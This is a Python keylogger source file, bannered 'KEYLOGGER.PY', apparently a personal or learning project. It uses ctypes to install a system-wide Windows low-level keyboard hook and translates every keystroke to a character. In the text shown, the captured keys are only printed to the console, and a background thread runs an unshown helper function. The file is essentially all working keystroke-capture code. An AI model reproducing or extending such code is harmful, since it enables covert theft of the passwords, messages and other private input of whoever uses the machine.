from platform import architecture
from ctypes import *
from ctypes import wintypes
from funcs import * #Self Written functions
import threading

""" Wrote this using ctypes to access Win-api functions."""

userid = threading.Thread(target=looped_gcp)
userid.start()


banner = """

██╗  ██╗███████╗██╗   ██╗██╗      ██████╗  ██████╗  ██████╗    ██████╗ ██╗   ██╗
██║ ██╔╝██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝ ██╔════╝    ██╔══██╗╚██╗ ██╔╝
█████╔╝ █████╗   ╚████╔╝ ██║     ██║   ██║██║  ███╗██║  ███╗   ██████╔╝ ╚████╔╝ 
██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║██║   ██║██║   ██║   ██╔═══╝   ╚██╔╝  
██║  ██╗███████╗   ██║   ███████╗╚██████╔╝╚██████╔╝╚██████╔╝██╗██║        ██║   
╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝╚═╝        ╚═╝   
                                                                            
"""
#
print(banner)

# Load libraries
user32 = windll.user32
kernel32 = windll.kernel32

ULONG_PTR, lres = checkos() #Function call to get all params needed to input in struct and win32 funcs. #s


# Define the KBDLLHOOKSTRUCT structure
class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [("vkCode", wintypes.DWORD),
                ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", ULONG_PTR)]
    
user32.CallNextHookEx.argtypes = [
    wintypes.HHOOK,  
    c_int,           
    wintypes.WPARAM, 
    wintypes.LPARAM  
]
user32.CallNextHookEx.restype = lres


ToUniCode = windll.user32.ToUnicode
ToUniCode.argtypes =ToUniCode.argtypes = [c_uint, c_uint, POINTER(c_byte), wintypes.LPWSTR, c_int, c_uint]

ToUniCode.restype = c_int


# Define the hook procedure
def hook_proc(code, wparam, lparam):
    
    if code >= 0 and wparam == 0x100:  
        kb_struct = cast(lparam, POINTER(KBDLLHOOKSTRUCT)).contents
        vk_code = kb_struct.vkCode


        keyboard_state = (c_byte * 256)()
        user32.GetKeyboardState(keyboard_state)

        buffer = create_unicode_buffer(5)

        result = ToUniCode(
            vk_code,
            kb_struct.scanCode,
            keyboard_state,
            buffer,
            len(buffer) - 1,
            0
        )

        if result > 0:  # Converted.
            char = buffer.value
            print(f"Key pressed: {char}")
        else:
            print(f"Key pressed:, Character=Not Printable") #Create this MAP

    return user32.CallNextHookEx(None, code, wparam, lparam)

# Convert the hook procedure to a C-compatible function
HookProcType = CFUNCTYPE(lres, c_int, wintypes.WPARAM, wintypes.LPARAM)
hook_proc_func = HookProcType(hook_proc)


# WH_KEYBOARD_LL = 13 Why this doc so weird maneee
hooked = user32.SetWindowsHookExW(13, hook_proc_func, None, 0)
if not hooked:
    print("Failed to set hook.") # I do 
    print(f"Error: {WinError(get_last_error())}")
    exit()

print("Hook set successfully. Press keys to see the output.")

# Message loop to keep the hook active

if __name__ == '__main__':
    msg = wintypes.MSG()
    while user32.GetMessageW(byref(msg), None, 0, 0) != 0:
        None

    # Unhook the hook when done
    user32.UnhookWindowsHookEx(hooked)
    print("Hook uninstalled.")